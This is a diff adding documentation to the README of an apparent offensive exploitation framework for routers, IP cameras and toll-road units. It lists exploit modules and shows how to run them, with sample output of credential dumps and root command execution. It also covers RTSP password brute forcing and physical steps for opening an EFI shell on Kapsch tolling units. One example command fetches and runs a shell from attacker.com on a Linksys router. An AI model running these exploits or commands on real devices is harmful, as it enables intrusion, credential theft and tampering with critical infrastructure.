@@ -899,6 +899,275 @@ nse/                        # Nmap NSE Lua scripts (pip install embedxpl[nse])
 └── embedxpl-camera-snapshot.nse
 ```
 
+## New Modules - BLOCO Batch v2.0
+
+This section documents the modules added in the BLOCO K, L, D, H, N, and I expansion batch.
+
+---
+
+### BLOCO K - ISP Brazilian Devices
+
+Exploits and scanners targeting ISP-issued CPEs and IP cameras commonly deployed by Brazilian internet providers (Claro, Vivo, TIM, OI, Algar, Sercomm-based ONTs).
+
+| Device | CVE | Module Path | Attack Type |
+|--------|-----|-------------|-------------|
+| TP-Link TL-SC3171 / SC4171 / SC4171G | CVE-2013-2573 | `exploits/cameras/tplink/tl_sc_series_cmd_inject_cve_2013_2573` | Command Injection (unauth) |
+| TP-Link TL-SC3171 / SC3130 | CVE-2013-2581 | `exploits/cameras/tplink/tl_sc_series_unauth_firmware_upload_cve_2013_2581` | Unauthenticated Firmware Upload |
+| D-Link DCS-932L | CVE-2026-36983 | `exploits/cameras/dlink/dcs_932l_light_sensor_rce_cve_2026_36983` | Light Sensor RCE |
+| D-Link DCS-932L | CVE-2025-5573 | `exploits/cameras/dlink/dcs_932l_admin_cmd_inject_cve_2025_5573` | Admin Panel Command Injection |
+| D-Link DCS-933L | CVE-2026-2218 | `exploits/cameras/dlink/dcs_933l_admin_cmd_inject_cve_2026_2218` | Admin Panel Command Injection |
+| ZTE ZXHN H267N / H268N | CVE-2026-34473 | `exploits/routers/zte/zxhn_h267n_h268n_dos_cve_2026_34473` | Denial of Service |
+| ZTE ZXHN H298A / H108N | CVE-2026-34474 | `exploits/routers/zte/zxhn_h298a_cred_dump_cve_2026_34474` | Credential Dump (ETHCheat) |
+| Intelbras IWR routers | - | `exploits/routers/intelbras/iwr_luci_rpc_rce` | LuCI RPC Unauthenticated RCE |
+| Multi-vendor BR ISP scanner | - | `scanners/specialized/br_isp_scanner` | Active discovery + vuln check |
+
+**Usage examples:**
+
+```bash
+# ZTE ZXHN H298A Credential Dump
+embedxpl use routers/zte/zxhn_h298a_cred_dump_cve_2026_34474
+embedxpl (ZXHNCred) > set rhost 192.168.1.1
+embedxpl (ZXHNCred) > run
+
+# Expected output (vulnerable device):
+[+] Connected to 192.168.1.1:80
+[+] Sending ETHCheat request: GET /getpage.lua?pid=1000&ETHCheat=1
+[!] VULNERABLE: Credentials exposed
+    Admin Password: admin123
+    WLAN PSK: MyWifiPass
+    SSID: ZTE_Router_ABC
+
+# Sample output (not vulnerable):
+[-] No credential fields found in response
+[-] Target may be patched or different firmware
+```
+
+```bash
+# Intelbras IWR LuCI RPC RCE
+embedxpl use routers/intelbras/iwr_luci_rpc_rce
+embedxpl (IWRLuci) > set rhost 192.168.0.1
+embedxpl (IWRLuci) > set cmd "id"
+embedxpl (IWRLuci) > run
+
+# Expected output:
+[+] LuCI RPC endpoint found at /cgi-bin/luci/rpc/sys
+[+] RCE via sys.exec: uid=0(root) gid=0(root)
+```
+
+```bash
+# Brazilian ISP multi-vendor scanner
+embedxpl use scanners/specialized/br_isp_scanner
+embedxpl (BRISPScan) > set target 192.168.0.0/24
+embedxpl (BRISPScan) > run
+```
+
+**Notes:** CVE-2026-34474 affects ZTE ZXHN H298A 1.1 and H108N 2.6. No authentication required.
+**Legal:** Use only on devices you own or have written authorization to test.
+
+---
+
+### BLOCO L - RouterPWN Ports
+
+Classic and modern RouterPWN-catalog exploits ported to the EmbedXPL-Forge module format.
+
+| Device | CVE / Reference | Module Path | Attack Type |
+|--------|----------------|-------------|-------------|
+| Cobham Aviator 700 SATCOM | CVE-2014-2943 | `exploits/specialized/vsat/cobham_aviator_admin_reset_cve_2014_2943` | Admin Password Reset (unauth) |
+| Huawei HG8245H | - | `osint/keygen/huawei_hg8245_wpa_keygen` | WPA Default Key Generator |
+| Alcatel-Lucent OmniPCX Enterprise | - | `exploits/voip/alcatel_lucent/omnipcx_enterprise_mastercgi_rce` | masterCGI Unauthenticated RCE |
+| Linksys E-Series (The Moon) | EDB-31683 | `exploits/routers/linksys/eseries_themoon_rce_tmunblock` | tmUnblock.cgi RCE |
+| NETGEAR DGN2200 | EDB-24665 | `exploits/routers/netgear/dgn2200_open_telnetd_rce` | open-telnetd Unauthenticated RCE |
+| Siemens FlexiISN | - | `exploits/routers/siemens/flexiisn_auth_bypass` | Authentication Bypass |
+| Thomson BTHomeHub | - | `exploits/routers/thomson/bthomehub_voice_hijack` | VoIP Configuration Hijack |
+| AT&T 2Wire Gateway | - | `exploits/routers/two_wire/atandt_gateway_crlf_dos` | CRLF Injection / DoS |
+
+**Usage examples:**
+
+```bash
+# Cobham Aviator admin reset (VSAT / Satellite terminal)
+embedxpl use specialized/vsat/cobham_aviator_admin_reset_cve_2014_2943
+embedxpl (CobhamReset) > set rhost 192.168.1.1
+embedxpl (CobhamReset) > run
+
+# Expected output:
+[+] Connected to Cobham Aviator 700 interface
+[+] Sending unauthenticated admin reset request
+[!] VULNERABLE: Admin password reset to default
+
+# Linksys eSeries The Moon RCE
+embedxpl use routers/linksys/eseries_themoon_rce_tmunblock
+embedxpl (TheMoon) > set rhost 192.168.1.1
+embedxpl (TheMoon) > set cmd "busybox wget http://attacker.com/shell -O /tmp/sh && chmod +x /tmp/sh && /tmp/sh"
+embedxpl (TheMoon) > run
+
+# Huawei HG8245H WPA keygen
+embedxpl use osint/keygen/huawei_hg8245_wpa_keygen
+embedxpl (HuaweiKeygen) > set ssid "HG8245H-ABCDEF"
+embedxpl (HuaweiKeygen) > run
+# Output: [+] Predicted WPA key: xA7z3k9P
+```
+
+**Notes:** The Moon worm (Linksys E-Series CVE) exploits tmUnblock.cgi without authentication on firmware < 2.0.08.
+**Legal:** Use only on devices you own or have written authorization to test.
+
+---
+
+### BLOCO D - RTSP Client Framework
+
+A pure Python RFC 2326 RTSP/1.0 client library used as the foundation for all RTSP camera attack modules.
+
+**Module:** `network/rtsp/rtsp_client.py` - `RTSPClient` class
+
+**Features:**
+- OPTIONS, DESCRIBE, SETUP, PLAY, TEARDOWN methods
+- Basic and Digest authentication (RFC 2617)
+- SDP session description parsing
+- Auto-reconnect and socket timeout management
+- Context manager support (`with RTSPClient(...) as client`)
+
+**Usage example:**
+
+```bash
+# Direct Python API usage
+python3 -c "
+from embedxpl.modules.network.rtsp.rtsp_client import RTSPClient
+with RTSPClient('192.168.1.10', 554, timeout=5) as client:
+    resp = client.describe('/live/ch0')
+    if resp.status_code == 200:
+        sdp = client.parse_sdp(resp.body)
+        print(f'Streams: {[s.media_type for s in sdp.streams]}')
+"
+```
+
+```bash
+# RTSP credential brute force (uses RTSPClient internally)
+embedxpl use network/rtsp/rtsp_cred_brute
+embedxpl (RTSPBrute) > set rhost 192.168.1.10
+embedxpl (RTSPBrute) > set rport 554
+embedxpl (RTSPBrute) > set path /live/ch0
+embedxpl (RTSPBrute) > run
+
+# Expected output:
+[+] Trying admin:admin ... 401 Unauthorized
+[+] Trying admin:12345 ... 200 OK
+[!] VALID: admin:12345
+```
+
+**Requirements:** Python 3.8+, no external dependencies.
+
+---
+
+### BLOCO H - FCC-ID Lookup
+
+OSINT module that queries the FCC Equipment Authorization database to retrieve device details from FCC ID codes found on hardware labels.
+
+**Module:** `osint/fcc_id_lookup.py`
+
+**Usage example:**
+
+```bash
+embedxpl use osint/fcc_id_lookup
+embedxpl (FCCLookup) > set fcc_id "PD5-WNR3500U"
+embedxpl (FCCLookup) > run
+
+# Expected output:
+[+] FCC ID: PD5-WNR3500U
+    Grantee: NETGEAR Inc.
+    Product: WNR3500U Wireless-N Gigabit Router
+    Frequency: 2.4GHz / 5GHz
+    Authorization: OET-65C (mobile device)
+    Test Lab: SGS
+    Grant Date: 2009-11-18
+    Internal Photos: [URL]
+    External Photos: [URL]
+    Test Reports: [URL]
+```
+
+**Tips:**
+- FCC IDs are printed on device labels (format: `GRANTEE_CODE-PRODUCT_CODE`)
+- Use for identifying OEM hardware, firmware base, or supplier chain
+- Combine with `osint/github_recon` to find public firmware repos for the device
+
+**Requirements:** Internet access, `requests` library.
+
+---
+
+### BLOCO N - iSpy Camera URL Generator
+
+Generates known camera stream URLs based on vendor, model, and firmware version, using the iSpy camera database format.
+
+**Module:** `osint/camera_url_generator.py`
+
+**Usage example:**
+
+```bash
+embedxpl use osint/camera_url_generator
+embedxpl (CameraURL) > set vendor "hikvision"
+embedxpl (CameraURL) > set model "DS-2CD2143G2"
+embedxpl (CameraURL) > run
+
+# Expected output:
+[+] Known stream URLs for Hikvision DS-2CD2143G2:
+    [1] rtsp://<ip>:554/Streaming/Channels/101
+    [2] rtsp://<ip>:554/Streaming/Channels/102
+    [3] rtsp://<ip>:554/h264/ch1/main/av_stream
+    [4] http://<ip>/ISAPI/Streaming/channels/1/picture
+    [5] http://<ip>/onvif/device_service
+
+# Generate wordlist for RTSP brute force
+embedxpl (CameraURL) > set output_file /tmp/hikvision_routes.txt
+embedxpl (CameraURL) > run
+```
+
+**Tips:**
+- Combine with `network/rtsp/rtsp_route_brute` to enumerate live streams
+- Supports 300+ camera vendors from the iSpy open camera database
+- Use `set all_vendors true` to dump all known URLs
+
+---
+
+### BLOCO I - Traffic Enforcement Modules
+
+Modules targeting traffic enforcement infrastructure (toll RSUs, radar systems, ANPR cameras).
+
+#### Kapsch TrafficCom RSU EFI Shell (CVE-2025-25734)
+
+**Module:** `exploits/specialized/traffic_enforcement/kapsch_rsu_efi_shell_cve_2025_25734`
+
+**Vulnerability:** Kapsch Road-Side Units (RSUs) used in electronic tolling lack UEFI Secure Boot enforcement and BIOS password protection, allowing physical attackers to drop into an EFI interactive shell and access the full filesystem.
+
+**Impact:** Configuration extraction, TLS private key theft, implant installation, toll enforcement bypass.
+
+**Usage example:**
+
+```bash
+# Network reachability check (management interface detection)
+embedxpl use specialized/traffic_enforcement/kapsch_rsu_efi_shell_cve_2025_25734
+embedxpl (KapschRSU) > set rhost 10.0.0.50
+embedxpl (KapschRSU) > check
+
+# Expected output (management interface exposed):
+[+] Kapsch RSU management interface detected on 10.0.0.50:80
+[!] Banner indicator: 'TrafficCom RSU' found
+[*] NOTE: Full exploitation requires physical on-site access
+
+# Assessment report
+embedxpl (KapschRSU) > run
+# Outputs: attack steps, mitigations checklist, risk level
+```
+
+**Physical exploitation steps:**
+1. Open RSU enclosure (tamper-evident screws)
+2. Connect USB keyboard and monitor to RSU mainboard
+3. Power cycle - press ESC/DEL/F2 during POST
+4. Navigate: Boot Manager -> EFI Internal Shell
+5. Access filesystem: `fs0:\efi\config\` for configuration extraction
+
+**Requirements:** Physical access to RSU hardware (monitor + USB keyboard), or network access to management interface for banner detection.
+**Legal:** Unauthorized access to toll enforcement infrastructure is a criminal offense. Use only on units you own or have explicit written authorization to assess.
+
+---
+
 ## Framework Architecture (v3.1.0)
 
 ### Component Architecture
